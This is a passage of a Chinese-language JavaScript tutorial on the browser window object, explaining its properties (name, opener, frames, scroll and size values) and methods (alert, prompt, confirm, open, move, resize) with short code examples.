<li><a href="https://en.wikipedia.org/wiki/Chakra_(JScript_engine)" target="_blank" rel="noopener">Chakra</a> (Microsoft Internet Explorer)</li>
<li><a href="https://en.wikipedia.org/wiki/WebKit#JavaScriptCore" target="_blank" rel="noopener">Nitro&#x2F;JavaScript Core</a> (Safari)</li>
<li><a href="https://dev.opera.com/articles/view/labs-carakan/" target="_blank" rel="noopener">Carakan</a> (Opera)</li>
<li><a href="https://developer.mozilla.org/en-US/docs/SpiderMonkey" target="_blank" rel="noopener">SpiderMonkey</a> (Firefox)</li>
<li><a href="https://en.wikipedia.org/wiki/Chrome_V8" target="_blank" rel="noopener">V8</a> (Chrome, Chromium)</li>
</ul>
<h2 id="window对象"><a href="#window对象" class="headerlink" title="window对象"></a>window对象</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>浏览器里面，<code>window</code>对象（注意，<code>w</code>为小写）指当前的浏览器窗口。它也是当前页面的顶层对象，即最高一层的对象，所有其他对象都是它的下属。一个变量如果未声明，那么默认就是顶层对象的属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; 1;</span><br><span class="line">window.a &#x2F;&#x2F; 1</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>a</code>是一个没有声明就直接赋值的变量，它自动成为顶层对象的属性。</p>
<p><code>window</code>有自己的实体含义，其实不适合当作最高一层的顶层对象，这是一个语言的设计失误。最早，设计这门语言的时候，原始设想是语言内置的对象越少越好，这样可以提高浏览器的性能。因此，语言设计者 Brendan Eich 就把<code>window</code>对象当作顶层对象，所有未声明就赋值的变量都自动变成<code>window</code>对象的属性。这种设计使得编译阶段无法检测出未声明变量，但到了今天已经没有办法纠正了。</p>
<h3 id="window-对象的属性"><a href="#window-对象的属性" class="headerlink" title="window 对象的属性"></a>window 对象的属性</h3><h4 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h4><p><code>window.name</code>属性是一个字符串，表示当前浏览器窗口的名字。窗口不一定需要名字，这个属性主要配合超链接和表单的<code>target</code>属性使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">window.name &#x3D; &#39;Hello World!&#39;;</span><br><span class="line">console.log(window.name)</span><br><span class="line">&#x2F;&#x2F; &quot;Hello World!&quot;</span><br></pre></td></tr></table></figure>

<p>该属性只能保存字符串，如果写入的值不是字符串，会自动转成字符串。各个浏览器对这个值的储存容量有所不同，但是一般来说，可以高达几MB。</p>
<p>只要浏览器窗口不关闭，这个属性是不会消失的。举例来说，访问<code>a.com</code>时，该页面的脚本设置了<code>window.name</code>，接下来在同一个窗口里面载入了<code>b.com</code>，新页面的脚本可以读到上一个网页设置的<code>window.name</code>。页面刷新也是这种情况。一旦浏览器窗口关闭后，该属性保存的值就会消失，因为这时窗口已经不存在了。</p>
<h4 id="window-closed，window-opener"><a href="#window-closed，window-opener" class="headerlink" title="window.closed，window.opener"></a>window.closed，window.opener</h4><p><code>window.closed</code>属性返回一个布尔值，表示窗口是否关闭。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.closed &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>

<p>上面代码检查当前窗口是否关闭。这种检查意义不大，因为只要能运行代码，当前窗口肯定没有关闭。这个属性一般用来检查，使用脚本打开的新窗口是否关闭。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var popup &#x3D; window.open();</span><br><span class="line"></span><br><span class="line">if ((popup !&#x3D;&#x3D; null) &amp;&amp; !popup.closed) &#123;</span><br><span class="line">  &#x2F;&#x2F; 窗口仍然打开着</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>window.opener</code>属性表示打开当前窗口的父窗口。如果当前窗口没有父窗口（即直接在地址栏输入打开），则返回<code>null</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.open().opener &#x3D;&#x3D;&#x3D; window &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>上面表达式会打开一个新窗口，然后返回<code>true</code>。</p>
<p>如果两个窗口之间不需要通信，建议将子窗口的<code>opener</code>属性显式设为<code>null</code>，这样可以减少一些安全隐患。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var newWin &#x3D; window.open(&#39;example.html&#39;, &#39;newWindow&#39;, &#39;height&#x3D;400,width&#x3D;400&#39;);</span><br><span class="line">newWin.opener &#x3D; null;</span><br></pre></td></tr></table></figure>

<p>上面代码中，子窗口的<code>opener</code>属性设为<code>null</code>，两个窗口之间就没办法再联系了。</p>
<p>通过<code>opener</code>属性，可以获得父窗口的全局属性和方法，但只限于两个窗口同源的情况（参见《同源限制》一章），且其中一个窗口由另一个打开。<code>&lt;a&gt;</code>元素添加<code>rel=&quot;noopener&quot;</code>属性，可以防止新打开的窗口获取父窗口，减轻被恶意网站修改父窗口 URL 的风险。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;an.evil.site&quot; target&#x3D;&quot;_blank&quot; rel&#x3D;&quot;noopener&quot;&gt;</span><br><span class="line">恶意网站</span><br><span class="line">&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<h4 id="window-self，window-window"><a href="#window-self，window-window" class="headerlink" title="window.self，window.window"></a>window.self，window.window</h4><p><code>window.self</code>和<code>window.window</code>属性都指向窗口本身。这两个属性只读。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.self &#x3D;&#x3D;&#x3D; window &#x2F;&#x2F; true</span><br><span class="line">window.window &#x3D;&#x3D;&#x3D; window &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<h4 id="window-frames，window-length"><a href="#window-frames，window-length" class="headerlink" title="window.frames，window.length"></a>window.frames，window.length</h4><p><code>window.frames</code>属性返回一个类似数组的对象，成员为页面内所有框架窗口，包括<code>frame</code>元素和<code>iframe</code>元素。<code>window.frames[0]</code>表示页面中第一个框架窗口。</p>
<p>如果<code>iframe</code>元素设置了<code>id</code>或<code>name</code>属性，那么就可以用属性值，引用这个<code>iframe</code>窗口。比如<code>&lt;iframe name=&quot;myIFrame&quot;&gt;</code>可以用<code>frames[&#39;myIFrame&#39;]</code>或者<code>frames.myIFrame</code>来引用。</p>
<p><code>frames</code>属性实际上是<code>window</code>对象的别名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frames &#x3D;&#x3D;&#x3D; window &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>因此，<code>frames[0]</code>也可以用<code>window[0]</code>表示。但是，从语义上看，<code>frames</code>更清晰，而且考虑到<code>window</code>还是全局对象，因此推荐表示多窗口时，总是使用<code>frames[0]</code>的写法。更多介绍请看下文的《多窗口操作》部分。</p>
<p><code>window.length</code>属性返回当前网页包含的框架总数。如果当前网页不包含<code>frame</code>和<code>iframe</code>元素，那么<code>window.length</code>就返回<code>0</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.frames.length &#x3D;&#x3D;&#x3D; window.length &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>上面代码表示，<code>window.frames.length</code>与<code>window.length</code>应该是相等的。</p>
<h4 id="window-frameElement"><a href="#window-frameElement" class="headerlink" title="window.frameElement"></a>window.frameElement</h4><p><code>window.frameElement</code>属性主要用于当前窗口嵌在另一个网页的情况（嵌入<code>&lt; object&gt;</code>、<code>&lt; iframe&gt;</code>或<code>&lt; embed&gt;</code>元素），返回当前窗口所在的那个元素节点。如果当前窗口是顶层窗口，或者所嵌入的那个网页不是同源的，该属性返回<code>null</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML 代码如下</span><br><span class="line">&#x2F;&#x2F; &lt;iframe src&#x3D;&quot;about.html&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 下面的脚本在 about.html 里面</span><br><span class="line">var frameEl &#x3D; window.frameElement;</span><br><span class="line">if (frameEl) &#123;</span><br><span class="line">  frameEl.src &#x3D; &#39;other.html&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>frameEl</code>变量就是<code>&lt; iframe&gt;</code>元素。</p>
<h4 id="window-top，window-parent"><a href="#window-top，window-parent" class="headerlink" title="window.top，window.parent"></a>window.top，window.parent</h4><p><code>window.top</code>属性指向最顶层窗口，主要用于在框架窗口（frame）里面获取顶层窗口。</p>
<p><code>window.parent</code>属性指向父窗口。如果当前窗口没有父窗口，<code>window.parent</code>指向自身。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (window.parent !&#x3D;&#x3D; window.top) &#123;</span><br><span class="line">  &#x2F;&#x2F; 表明当前窗口嵌入不止一层</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于不包含框架的网页，这两个属性等同于<code>window</code>对象。</p>
<h4 id="window-status"><a href="#window-status" class="headerlink" title="window.status"></a>window.status</h4><p><code>window.status</code>属性用于读写浏览器状态栏的文本。但是，现在很多浏览器都不允许改写状态栏文本，所以使用这个方法不一定有效。</p>
<h4 id="window-devicePixelRatio"><a href="#window-devicePixelRatio" class="headerlink" title="window.devicePixelRatio"></a>window.devicePixelRatio</h4><p><code>window.devicePixelRatio</code>属性返回一个数值，表示一个 CSS 像素的大小与一个物理像素的大小之间的比率。也就是说，它表示一个 CSS 像素由多少个物理像素组成。它可以用于判断用户的显示环境，如果这个比率较大，就表示用户正在使用高清屏幕，因此可以显示较大像素的图片。</p>
<h4 id="位置大小属性"><a href="#位置大小属性" class="headerlink" title="位置大小属性"></a>位置大小属性</h4><p>以下属性返回<code>window</code>对象的位置信息和大小信息。</p>
<p><strong>（1）window.screenX，window.screenY</strong></p>
<p><code>window.screenX</code>和<code>window.screenY</code>属性，返回浏览器窗口左上角相对于当前屏幕左上角的水平距离和垂直距离（单位像素）。这两个属性只读。</p>
<p><strong>（2） window.innerHeight，window.innerWidth</strong></p>
<p><code>window.innerHeight</code>和<code>window.innerWidth</code>属性，返回网页在当前窗口中可见部分的高度和宽度，即“视口”（viewport）的大小（单位像素）。这两个属性只读。</p>
<p>用户放大网页的时候（比如将网页从100%的大小放大为200%），这两个属性会变小。因为这时网页的像素大小不变（比如宽度还是960像素），只是每个像素占据的屏幕空间变大了，因此可见部分（视口）就变小了。</p>
<p>注意，这两个属性值包括滚动条的高度和宽度。</p>
<p><strong>（3）window.outerHeight，window.outerWidth</strong></p>
<p><code>window.outerHeight</code>和<code>window.outerWidth</code>属性返回浏览器窗口的高度和宽度，包括浏览器菜单和边框（单位像素）。这两个属性只读。</p>
<p><strong>（4）window.scrollX，window.scrollY</strong></p>
<p><code>window.scrollX</code>属性返回页面的水平滚动距离，<code>window.scrollY</code>属性返回页面的垂直滚动距离，单位都为像素。这两个属性只读。</p>
<p>注意，这两个属性的返回值不是整数，而是双精度浮点数。如果页面没有滚动，它们的值就是<code>0</code>。</p>
<p>举例来说，如果用户向下拉动了垂直滚动条75像素，那么<code>window.scrollY</code>就是75左右。用户水平向右拉动水平滚动条200像素，<code>window.scrollX</code>就是200左右。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (window.scrollY &lt; 75) &#123;</span><br><span class="line">  window.scroll(0, 75);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，如果页面向下滚动的距离小于75像素，那么页面向下滚动75像素。</p>
<p><strong>（5）window.pageXOffset，window.pageYOffset</strong></p>
<p><code>window.pageXOffset</code>属性和<code>window.pageYOffset</code>属性，是<code>window.scrollX</code>和<code>window.scrollY</code>别名。</p>
<h4 id="组件属性"><a href="#组件属性" class="headerlink" title="组件属性"></a>组件属性</h4><p>组件属性返回浏览器的组件对象。这样的属性有下面几个。</p>
<ul>
<li><code>window.locationbar</code>：地址栏对象</li>
<li><code>window.menubar</code>：菜单栏对象</li>
<li><code>window.scrollbars</code>：窗口的滚动条对象</li>
<li><code>window.toolbar</code>：工具栏对象</li>
<li><code>window.statusbar</code>：状态栏对象</li>
<li><code>window.personalbar</code>：用户安装的个人工具栏对象</li>
</ul>
<p>这些对象的<code>visible</code>属性是一个布尔值，表示这些组件是否可见。这些属性只读。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">window.locationbar.visible</span><br><span class="line">window.menubar.visible</span><br><span class="line">window.scrollbars.visible</span><br><span class="line">window.toolbar.visible</span><br><span class="line">window.statusbar.visible</span><br><span class="line">window.personalbar.visible</span><br></pre></td></tr></table></figure>

<h4 id="全局对象属性"><a href="#全局对象属性" class="headerlink" title="全局对象属性"></a>全局对象属性</h4><p>全局对象属性指向一些浏览器原生的全局对象。</p>
<ul>
<li><code>window.document</code>：指向<code>document</code>对象，详见《document 对象》一章。注意，这个属性有同源限制。只有来自同源的脚本才能读取这个属性。</li>
<li><code>window.location</code>：指向<code>Location</code>对象，用于获取当前窗口的 URL 信息。它等同于<code>document.location</code>属性，详见《Location 对象》一章。</li>
<li><code>window.navigator</code>：指向<code>Navigator</code>对象，用于获取环境信息，详见《Navigator 对象》一章。</li>
<li><code>window.history</code>：指向<code>History</code>对象，表示浏览器的浏览历史，详见《History 对象》一章。</li>
<li><code>window.localStorage</code>：指向本地储存的 localStorage 数据，详见《Storage 接口》一章。</li>
<li><code>window.sessionStorage</code>：指向本地储存的 sessionStorage 数据，详见《Storage 接口》一章。</li>
<li><code>window.console</code>：指向<code>console</code>对象，用于操作控制台，详见《console 对象》一章。</li>
<li><code>window.screen</code>：指向<code>Screen</code>对象，表示屏幕信息，详见《Screen 对象》一章。</li>
</ul>
<h4 id="window-isSecureContext"><a href="#window-isSecureContext" class="headerlink" title="window.isSecureContext"></a>window.isSecureContext</h4><p><code>window.isSecureContext</code>属性返回一个布尔值，表示当前窗口是否处在加密环境。如果是 HTTPS 协议，就是<code>true</code>，否则就是<code>false</code>。</p>
<h3 id="window-对象的方法"><a href="#window-对象的方法" class="headerlink" title="window 对象的方法"></a>window 对象的方法</h3><h4 id="window-alert-，window-prompt-，window-confirm"><a href="#window-alert-，window-prompt-，window-confirm" class="headerlink" title="window.alert()，window.prompt()，window.confirm()"></a>window.alert()，window.prompt()，window.confirm()</h4><p><code>window.alert()</code>、<code>window.prompt()</code>、<code>window.confirm()</code>都是浏览器与用户互动的全局方法。它们会弹出不同的对话框，要求用户做出回应。注意，这三个方法弹出的对话框，都是浏览器统一规定的式样，无法定制。</p>
<p><strong>（1）window.alert()</strong></p>
<p><code>window.alert()</code>方法弹出的对话框，只有一个“确定”按钮，往往用来通知用户某些信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.alert(&#39;Hello World&#39;);</span><br></pre></td></tr></table></figure>

<p>用户只有点击“确定”按钮，对话框才会消失。对话框弹出期间，浏览器窗口处于冻结状态，如果不点“确定”按钮，用户什么也干不了。</p>
<p><code>window.alert()</code>方法的参数只能是字符串，没法使用 CSS 样式，但是可以用<code>\n</code>指定换行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(&#39;本条提示\n分成两行&#39;);</span><br></pre></td></tr></table></figure>

<p><strong>（2）window.prompt()</strong></p>
<p><code>window.prompt()</code>方法弹出的对话框，提示文字的下方，还有一个输入框，要求用户输入信息，并有“确定”和“取消”两个按钮。它往往用来获取用户输入的数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var result &#x3D; prompt(&#39;您的年龄？&#39;, 25)</span><br></pre></td></tr></table></figure>

<p>上面代码会跳出一个对话框，文字提示为“您的年龄？”，要求用户在对话框中输入自己的年龄（默认显示25）。用户填入的值，会作为返回值存入变量<code>result</code>。</p>
<p><code>window.prompt()</code>的返回值有两种情况，可能是字符串（有可能是空字符串），也有可能是<code>null</code>。具体分成三种情况。</p>
<ol>
<li>用户输入信息，并点击“确定”，则用户输入的信息就是返回值。</li>
<li>用户没有输入信息，直接点击“确定”，则输入框的默认值就是返回值。</li>
<li>用户点击了“取消”（或者按了 ESC 按钮），则返回值是<code>null</code>。</li>
</ol>
<p><code>window.prompt()</code>方法的第二个参数是可选的，但是最好总是提供第二个参数，作为输入框的默认值。</p>
<p><strong>（3）window.confirm()</strong></p>
<p><code>window.confirm()</code>方法弹出的对话框，除了提示信息之外，只有“确定”和“取消”两个按钮，往往用来征询用户是否同意。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var result &#x3D; confirm(&#39;你最近好吗？&#39;);</span><br></pre></td></tr></table></figure>

<p>上面代码弹出一个对话框，上面只有一行文字“你最近好吗？”，用户选择点击“确定”或“取消”。</p>
<p><code>confirm</code>方法返回一个布尔值，如果用户点击“确定”，返回<code>true</code>；如果用户点击“取消”，则返回<code>false</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var okay &#x3D; confirm(&#39;Please confirm this message.&#39;);</span><br><span class="line">if (okay) &#123;</span><br><span class="line">  &#x2F;&#x2F; 用户按下“确定”</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  &#x2F;&#x2F; 用户按下“取消”</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>confirm</code>的一个用途是，用户离开当前页面时，弹出一个对话框，问用户是否真的要离开。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">window.onunload &#x3D; function () &#123;</span><br><span class="line">  return window.confirm(&#39;你确定要离开当面页面吗？&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这三个方法都具有堵塞效应，一旦弹出对话框，整个页面就是暂停执行，等待用户做出反应。</p>
<h4 id="window-open-window-close-，window-stop"><a href="#window-open-window-close-，window-stop" class="headerlink" title="window.open(), window.close()，window.stop()"></a>window.open(), window.close()，window.stop()</h4><p><strong>（1）window.open()</strong></p>
<p><code>window.open</code>方法用于新建另一个浏览器窗口，类似于浏览器菜单的新建窗口选项。它会返回新窗口的引用，如果无法新建窗口，则返回<code>null</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var popup &#x3D; window.open(&#39;somefile.html&#39;);</span><br></pre></td></tr></table></figure>

<p>上面代码会让浏览器弹出一个新建窗口，网址是当前域名下的<code>somefile.html</code>。</p>
<p><code>open</code>方法一共可以接受三个参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.open(url, windowName, [windowFeatures])</span><br></pre></td></tr></table></figure>

<ul>
<li><code>url</code>：字符串，表示新窗口的网址。如果省略，默认网址就是<code>about:blank</code>。</li>
<li><code>windowName</code>：字符串，表示新窗口的名字。如果该名字的窗口已经存在，则占用该窗口，不再新建窗口。如果省略，就默认使用<code>_blank</code>，表示新建一个没有名字的窗口。另外还有几个预设值，<code>_self</code>表示当前窗口，<code>_top</code>表示顶层窗口，<code>_parent</code>表示上一层窗口。</li>
<li><code>windowFeatures</code>：字符串，内容为逗号分隔的键值对（详见下文），表示新窗口的参数，比如有没有提示栏、工具条等等。如果省略，则默认打开一个完整 UI 的新窗口。如果新建的是一个已经存在的窗口，则该参数不起作用，浏览器沿用以前窗口的参数。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var popup &#x3D; window.open(</span><br><span class="line">  &#39;somepage.html&#39;,</span><br><span class="line">  &#39;DefinitionsWindows&#39;,</span><br><span class="line">  &#39;height&#x3D;200,width&#x3D;200,location&#x3D;no,status&#x3D;yes,resizable&#x3D;yes,scrollbars&#x3D;yes&#39;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>上面代码表示，打开的新窗口高度和宽度都为200像素，没有地址栏，但有状态栏和滚动条，允许用户调整大小。</p>
<p>第三个参数可以设定如下属性。</p>
<ul>
<li>left：新窗口距离屏幕最左边的距离（单位像素）。注意，新窗口必须是可见的，不能设置在屏幕以外的位置。</li>
<li>top：新窗口距离屏幕最顶部的距离（单位像素）。</li>
<li>height：新窗口内容区域的高度（单位像素），不得小于100。</li>
<li>width：新窗口内容区域的宽度（单位像素），不得小于100。</li>
<li>outerHeight：整个浏览器窗口的高度（单位像素），不得小于100。</li>
<li>outerWidth：整个浏览器窗口的宽度（单位像素），不得小于100。</li>
<li>menubar：是否显示菜单栏。</li>
<li>toolbar：是否显示工具栏。</li>
<li>location：是否显示地址栏。</li>
<li>personalbar：是否显示用户自己安装的工具栏。</li>
<li>status：是否显示状态栏。</li>
<li>dependent：是否依赖父窗口。如果依赖，那么父窗口最小化，该窗口也最小化；父窗口关闭，该窗口也关闭。</li>
<li>minimizable：是否有最小化按钮，前提是<code>dialog=yes</code>。</li>
<li>noopener：新窗口将与父窗口切断联系，即新窗口的<code>window.opener</code>属性返回<code>null</code>，父窗口的<code>window.open()</code>方法也返回<code>null</code>。</li>
<li>resizable：新窗口是否可以调节大小。</li>
<li>scrollbars：是否允许新窗口出现滚动条。</li>
<li>dialog：新窗口标题栏是否出现最大化、最小化、恢复原始大小的控件。</li>
<li>titlebar：新窗口是否显示标题栏。</li>
<li>alwaysRaised：是否显示在所有窗口的顶部。</li>
<li>alwaysLowered：是否显示在父窗口的底下。</li>
<li>close：新窗口是否显示关闭按钮。</li>
</ul>
<p>对于那些可以打开和关闭的属性，设为<code>yes</code>或<code>1</code>或不设任何值就表示打开，比如<code>status=yes</code>、<code>status=1</code>、<code>status</code>都会得到同样的结果。如果想设为关闭，不用写<code>no</code>，而是直接省略这个属性即可。也就是说，如果在第三个参数中设置了一部分属性，其他没有被设置的<code>yes/no</code>属性都会被设成<code>no</code>，只有<code>titlebar</code>和关闭按钮除外（它们的值默认为<code>yes</code>）。</p>
<p>上面这些属性，属性名与属性值之间用等号连接，属性与属性之间用逗号分隔。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;height&#x3D;200,width&#x3D;200,location&#x3D;no,status&#x3D;yes,resizable&#x3D;yes,scrollbars&#x3D;yes&#39;</span><br></pre></td></tr></table></figure>

<p>另外，<code>open()</code>方法的第二个参数虽然可以指定已经存在的窗口，但是不等于可以任意控制其他窗口。为了防止被不相干的窗口控制，浏览器只有在两个窗口同源，或者目标窗口被当前网页打开的情况下，才允许<code>open</code>方法指向该窗口。</p>
<p><code>window.open</code>方法返回新窗口的引用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var windowB &#x3D; window.open(&#39;windowB.html&#39;, &#39;WindowB&#39;);</span><br><span class="line">windowB.window.name &#x2F;&#x2F; &quot;WindowB&quot;</span><br></pre></td></tr></table></figure>

<p>注意，如果新窗口和父窗口不是同源的（即不在同一个域），它们彼此不能获取对方窗口对象的内部属性。</p>
<p>下面是另一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var w &#x3D; window.open();</span><br><span class="line">console.log(&#39;已经打开新窗口&#39;);</span><br><span class="line">w.location &#x3D; &#39;http:&#x2F;&#x2F;example.com&#39;;</span><br></pre></td></tr></table></figure>

<p>上面代码先打开一个新窗口，然后在该窗口弹出一个对话框，再将网址导向<code>example.com</code>。</p>
<p>由于<code>open</code>这个方法很容易被滥用，许多浏览器默认都不允许脚本自动新建窗口。只允许在用户点击链接或按钮时，脚本做出反应，弹出新窗口。因此，有必要检查一下打开新窗口是否成功。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var popup &#x3D; window.open();</span><br><span class="line">if (popup &#x3D;&#x3D;&#x3D; null) &#123;</span><br><span class="line">  &#x2F;&#x2F; 新建窗口失败</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>（2）window.close()</strong></p>
<p><code>window.close</code>方法用于关闭当前窗口，一般只用来关闭<code>window.open</code>方法新建的窗口。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popup.close()</span><br></pre></td></tr></table></figure>

<p>该方法只对顶层窗口有效，<code>iframe</code>框架之中的窗口使用该方法无效。</p>
<p><strong>（3）window.stop()</strong></p>
<p><code>window.stop()</code>方法完全等同于单击浏览器的停止按钮，会停止加载图像、视频等正在或等待加载的对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.stop()</span><br></pre></td></tr></table></figure>

<h4 id="window-moveTo-，window-moveBy"><a href="#window-moveTo-，window-moveBy" class="headerlink" title="window.moveTo()，window.moveBy()"></a>window.moveTo()，window.moveBy()</h4><p><code>window.moveTo()</code>方法用于移动浏览器窗口到指定位置。它接受两个参数，分别是窗口左上角距离屏幕左上角的水平距离和垂直距离，单位为像素。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.moveTo(100, 200)</span><br></pre></td></tr></table></figure>

<p>上面代码将窗口移动到屏幕<code>(100, 200)</code>的位置。</p>
<p><code>window.moveBy()</code>方法将窗口移动到一个相对位置。它接受两个参数，分别是窗口左上角向右移动的水平距离和向下移动的垂直距离，单位为像素。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.moveBy(25, 50)</span><br></pre></td></tr></table></figure>

<p>上面代码将窗口向右移动25像素、向下移动50像素。</p>
<p>为了防止有人滥用这两个方法，随意移动用户的窗口，目前只有一种情况，浏览器允许用脚本移动窗口：该窗口是用<code>window.open()</code>方法新建的，并且窗口里只有它一个 Tab 页。除此以外的情况，使用上面两个方法都是无效的。</p>
<h4 id="window-resizeTo-，window-resizeBy"><a href="#window-resizeTo-，window-resizeBy" class="headerlink" title="window.resizeTo()，window.resizeBy()"></a>window.resizeTo()，window.resizeBy()</h4><p><code>window.resizeTo()</code>方法用于缩放窗口到指定大小。</p>
<p>它接受两个参数，第一个是缩放后的窗口宽度（<code>outerWidth</code>属性，包含滚动条、标题栏等等），第二个是缩放后的窗口高度（<code>outerHeight</code>属性）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">window.resizeTo(</span><br><span class="line">  window.screen.availWidth &#x2F; 2,</span><br><span class="line">  window.screen.availHeight &#x2F; 2</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>上面代码将当前窗口缩放到，屏幕可用区域的一半宽度和高度。</p>
<p><code>window.resizeBy()</code>方法用于缩放窗口。它与<code>window.resizeTo()</code>的区别是，它按照相对的量缩放，<code>window.resizeTo()</code>需要给出缩放后的绝对大小。</p>
<p>它接受两个参数，第一个是水平缩放的量，第二个是垂直缩放的量，单位都是像素。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.resizeBy(-200, -200)</span><br></pre></td></tr></table></figure>

<p>上面的代码将当前窗口的宽度和高度，都缩小200像素。</p>
<h4 id="window-scrollTo-，window-scroll-，window-scrollBy"><a href="#window-scrollTo-，window-scroll-，window-scrollBy" class="headerlink" title="window.scrollTo()，window.scroll()，window.scrollBy()"></a>window.scrollTo()，window.scroll()，window.scrollBy()</h4><p><code>window.scrollTo</code>方法用于将文档滚动到指定位置。它接受两个参数，表示滚动后位于窗口左上角的页面坐标。</p>
